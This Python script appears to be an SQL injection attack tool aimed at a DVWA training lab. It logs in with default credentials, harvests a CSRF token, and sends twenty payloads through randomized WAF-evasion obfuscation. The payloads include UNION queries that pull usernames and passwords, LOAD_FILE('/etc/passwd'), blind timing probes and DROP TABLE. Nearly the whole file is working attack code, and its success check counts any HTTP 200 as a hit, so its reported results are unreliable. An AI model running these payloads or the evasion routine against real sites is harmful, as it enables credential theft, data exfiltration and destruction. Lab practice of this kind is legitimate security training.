import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote_plus
import random
import string
import base64
import time

BASE = "http://dvwa.local"
USERNAME = "admin"
PASSWORD = "password"
TIMEOUT = 10

s = requests.Session()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

payloads = [
    "' OR 1=1--",
    "' OR '1'='1", 
    "' UNION SELECT null, null--",
    "' UNION SELECT 1, @@version--",
    "' UNION SELECT 1, table_name FROM information_schema.tables--",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT username, password FROM users--",
    "' AND SLEEP(5)--",
    "'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1--",
    "' ORDER BY 1--",
    "' ORDER BY 3--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--",
    "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1, user()--",
    "' UNION SELECT 1, database()--",
    "' AND 1=IF(1=1, SLEEP(3), 0)--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--"
]

def advanced_obfuscate_payload(payload):
    """
    Продвинутая обфускация с разными методами
    """
    methods_used = []
    
    # Метод 1: Hex кодирование
    def hex_encode(text):
        methods_used.append("HEX")
        return ''.join([f'0x{ord(c):02x}' for c in text])
    
    # Метод 2: Base64 кодирование
    def base64_encode(text):
        methods_used.append("BASE64")
        encoded = base64.b64encode(text.encode()).decode()
        return f"FROM_BASE64('{encoded}')"
    
    # Метод 3: Конкатенация строк
    def concat_obfuscate(text):
        methods_used.append("CONCAT")
        parts = [f"CHAR({ord(c)})" for c in text]
        return '||'.join(parts) if random.random() < 0.5 else '+'.join(parts)
    
    # Метод 4: Unicode экранирование
    def unicode_escape(text):
        methods_used.append("UNICODE")
        return ''.join([f'\\u{ord(c):04x}' if random.random() < 0.3 else c for c in text])
    
    # Метод 5: Комментарии MySQL
    def mysql_comment_obfuscate(text):
        methods_used.append("MYSQL_COMMENT")
        comments = ["/*!", "/*!50000", "/*/**/", "/**/"]
        words = text.split()
        for i in range(len(words)):
            if random.random() < 0.4:
                words[i] = f"{random.choice(comments)}{words[i]}{'*/' if '/*' in comments[0] else ''}"
        return ' '.join(words)
    
    # Метод 6: Двойное URL кодирование
    def double_url_encode(text):
        methods_used.append("DOUBLE_URL")
        return quote_plus(quote_plus(text, safe=''), safe='')
    
    # Метод 7: Табуляции и переносы строк
    def whitespace_obfuscate(text):
        methods_used.append("WHITESPACE")
        whitespace = ['%09', '%0A', '%0D', '%0C', '%0B']
        result = ""
        for char in text:
            result += char
            if char == ' ' and random.random() < 0.3:
                result += random.choice(whitespace)
        return result
    
    # Метод 8: Ключевые слова в верхнем/нижнем регистре
    def case_obfuscate(text):
        methods_used.append("CASE")
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        result = text
        for keyword in keywords:
            if keyword in result.upper():
                if random.random() < 0.5:
                    result = result.replace(keyword, keyword.lower())
                else:
                    # Смешанный регистр
                    mixed = ''.join([c.upper() if random.random() < 0.5 else c.lower() for c in keyword])
                    result = result.replace(keyword, mixed)
        return result
    
    # Метод 9: Замена операторов
    def operator_replacement(text):
        methods_used.append("OPERATOR")
        replacements = {
            '=': [' LIKE ', ' REGEXP ', ' IN ', ' BETWEEN 0 AND 2'],
            '1': ['0x31', 'true', '1+0', '2-1', '3-2'],
            "'": ['%27', '/*\'*/', '`', '"'],
            ' ': ['/**/', '%20', '%09']
        }
        result = text
        for old, new_options in replacements.items():
            if old in result:
                result = result.replace(old, random.choice(new_options))
        return result
    
    # Метод 10: Встроенные функции MySQL
    def mysql_functions_obfuscate(text):
        methods_used.append("MYSQL_FUNCTIONS")
        replacements = {
            'version()': ['@@version', 'VERSION()', '/*!50000 VERSION()*/'],
            'user()': ['CURRENT_USER()', 'SYSTEM_USER()', 'SESSION_USER()'],
            'database()': ['SCHEMA()', 'DATABASE()'],
            'null': ['NULL', 'IFNULL(1,2)', 'COALESCE(1,2)']
        }
        result = text
        for old, new_options in replacements.items():
            if old in result.lower():
                result = result.replace(old, random.choice(new_options))
        return result
    
    # Выбираем случайные методы обфускации
    available_methods = [
        hex_encode,
        concat_obfuscate,
        mysql_comment_obfuscate,
        case_obfuscate,
        operator_replacement,
        mysql_functions_obfuscate,
        whitespace_obfuscate
    ]
    
    # Применяем 2-3 случайных метода
    num_methods = random.randint(2, 3)
    selected_methods = random.sample(available_methods, num_methods)
    
    obfuscated = payload
    for method in selected_methods:
        try:
            obfuscated = method(obfuscated)
        except:
            continue  # Если метод не сработал, продолжаем
    
    # Всегда добавляем базовое URL кодирование
    methods_used.append("URL_ENCODE")
    obfuscated = quote_plus(obfuscated, safe='')
    
    return obfuscated, methods_used

def get_login_form_and_action(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        return None, None
    action = form.get("action") or ""
    action = urljoin(base_url, action)
    inputs = {}
    for inp in form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        inputs[name] = inp.get("value", "")
    return action, inputs

def extract_csrf_from_html(html):
    soup = BeautifulSoup(html, "html.parser")
    el = soup.find("input", {"name": "csrftoken"})
    if el and el.has_attr("value"):
        return el["value"]
    for candidate in ("user_token", "token", "security_token"):
        el2 = soup.find("input", {"name": candidate})
        if el2 and el2.has_attr("value"):
            return el2["value"]
    return None

def main():
    print("=" * 80)
    print("DVWA SQL INJECTION TESTER WITH ADVANCED OBFUSCATION")
    print("=" * 80)
    
    login_url = urljoin(BASE, "/login.php")
    print(f"\n[1/4] 🔐 LOGIN PHASE")
    print(f"Target: {login_url}")

    # 1) GET login page
    try:
        r = s.get(login_url, headers=HEADERS, timeout=TIMEOUT)
        print(f"✅ GET {login_url} -> {r.status_code}")
    except Exception as e:
        print(f"❌ GET {login_url} -> ERROR: {e}")
        sys.exit(1)

    action, inputs = get_login_form_and_action(r.text, login_url)
    if not action:
        print("❌ ERROR: login form not found")
        sys.exit(2)

    payload_login = inputs.copy()
    payload_login["username"] = USERNAME
    payload_login["password"] = PASSWORD

    post_headers = HEADERS.copy()
    post_headers["Referer"] = login_url

    # 2) POST login
    print(f"🔑 Logging in as {USERNAME}:{PASSWORD}")
    r_post = s.post(action, data=payload_login, headers=post_headers, allow_redirects=False, timeout=TIMEOUT)
    print(f"✅ POST {action} -> {r_post.status_code}")
    
    if r_post.status_code in (301,302,303,307,308,403,500):
        loc = r_post.headers.get("Location")
        print(f"🔄 Redirect to: {loc}")
        next_url = urljoin(action, loc) if loc else urljoin(BASE, "/index.php")
        r_after = s.get(next_url, headers=HEADERS, allow_redirects=True, timeout=TIMEOUT)
        print(f"✅ After redirect -> {r_after.status_code} | URL: {r_after.url}")
    else:
        r_after = r_post
        print(f"ℹ  No redirect after POST")

    # Check cookies
    if s.cookies:
        print("🍪 Cookies obtained:")
        for k, v in s.cookies.items():
            print(f"   {k} = {v}")
    else:
        print("❌ No cookies after login")

    # 3) Get SQLi page for CSRF token
    print(f"\n[2/4] 🔍 GETTING CSRF TOKEN")
    sqli_page_url = urljoin(BASE, "/vulnerabilities/sqli/")
    print(f"Target: {sqli_page_url}")
    
    try:
        r_sqli = s.get(sqli_page_url, headers={"Referer": r_after.url, **HEADERS}, allow_redirects=True, timeout=TIMEOUT)
        print(f"✅ GET {sqli_page_url} -> {r_sqli.status_code} | Final URL: {r_sqli.url}")
    except Exception as e:
        print(f"❌ GET {sqli_page_url} -> ERROR: {e}")
        sys.exit(4)

    csrftoken = extract_csrf_from_html(r_sqli.text)
    if not csrftoken:
        print("❌ ERROR: csrftoken not found on SQLi page")
        sys.exit(5)
    
    print(f"✅ CSRF Token: {csrftoken[:20]}...")

    # 4) Test payloads with advanced obfuscation
    print(f"\n[3/4] 🚀 TESTING PAYLOADS WITH ADVANCED OBFUSCATION")
    print("=" * 80)
    
    successful_payloads = []
    
    for idx, original_payload in enumerate(payloads, start=1):
        print(f"\n🎯 [{idx}/{len(payloads)}] Testing: {original_payload}")
        
        # 3 попытки с разной обфускацией для каждого payload
        for attempt in range(3):
            obfuscated_payload, methods_used = advanced_obfuscate_payload(original_payload)
            
            target_url = f"{BASE}/vulnerabilities/sqli/?id={obfuscated_payload}&Submit=Submit&csrftoken={csrftoken}"
            
            print(f"   🔄 Attempt {attempt+1}:")
            print(f"      Methods: {', '.join(methods_used)}")
            print(f"      Obfuscated: {obfuscated_payload[:60]}{'...' if len(obfuscated_payload) > 60 else ''}")
            print(f"      Length: {len(obfuscated_payload)} chars")
            print(f"      URL: {target_url[:80]}{'...' if len(target_url) > 80 else ''}")

            # Выполняем запрос
            target_headers = HEADERS.copy()
            target_headers["Referer"] = r_sqli.url

            try:
                start_time = time.time()
                r_target = s.get(target_url, headers=target_headers, allow_redirects=False, timeout=TIMEOUT)
                response_time = time.time() - start_time
                
                status_icon = "✅" if r_target.status_code == 200 else "⚠" if r_target.status_code in (301, 302, 303, 307, 308) else "❌"
                
                print(f"      {status_icon} Response: {r_target.status_code} | Size: {len(r_target.content)} bytes | Time: {response_time:.2f}s")
                
                if r_target.status_code == 200:
                    print(f"      🎉 SUCCESS! Payload worked!")
                    
                    # Проверяем содержание ответа
                    content_preview = r_target.text[:200].replace('\n', ' ').replace('\r', ' ')
                    print(f"      📄 Content preview: {content_preview}...")
                    
                    successful_payloads.append((original_payload, obfuscated_payload, target_url, len(r_target.content), methods_used))
                    break  # Переходим к следующему payload
                    
                elif r_target.status_code in (301, 302, 303, 307, 308):
                    redirect_url = r_target.headers.get('Location', 'Unknown')
                    print(f"      🔄 Redirected to: {redirect_url}")
                    
                elif r_target.status_code == 403:
                    print(f"      🚫 BLOCKED by WAF")
                    
            except Exception as e:
                print(f"      💥 Request failed: {str(e)}")

    # 5) Final summary with detailed results
    print(f"\n[4/4] 📊 FINAL RESULTS")
    print("=" * 80)
    
    if successful_payloads:
        print(f"🎉 SUCCESS: {len(successful_payloads)}/{len(payloads)} payloads worked!")
        print("\n" + "=" * 60)
        print("SUCCESSFUL PAYLOADS DETAILS:")
        print("=" * 60)
        
        for i, (orig, obf, url, size, methods) in enumerate(successful_payloads, 1):
            print(f"\n{i}. ORIGINAL: {orig}")
            print(f"   OBFUSCATED: {obf}")
            print(f"   METHODS: {', '.join(methods)}")
            print(f"   URL LENGTH: {len(url)} chars")
            print(f"   RESPONSE SIZE: {size} bytes")
            print(f"   TEST LINK: curl -s -b 'PHPSESSID={s.cookies.get('PHPSESSID', '')}' '{url}'")
            
    else:
        print("❌ No successful payloads found")
    
    success_rate = (len(successful_payloads) / len(payloads)) * 100
    print(f"\n" + "=" * 60)
    print(f"OVERALL SUCCESS RATE: {success_rate:.1f}% ({len(successful_payloads)}/{len(payloads)})")
    
    if successful_payloads:
        print(f"\n💡 SUCCESSFUL METHODS ANALYSIS:")
        method_stats = {}
        for _, _, _, _, methods in successful_payloads:
            for method in methods:
                method_stats[method] = method_stats.get(method, 0) + 1
        
        for method, count in sorted(method_stats.items(), key=lambda x: x[1], reverse=True):
            print(f"   {method}: {count} successful payloads")

if __name__ == "__main__":
    main()
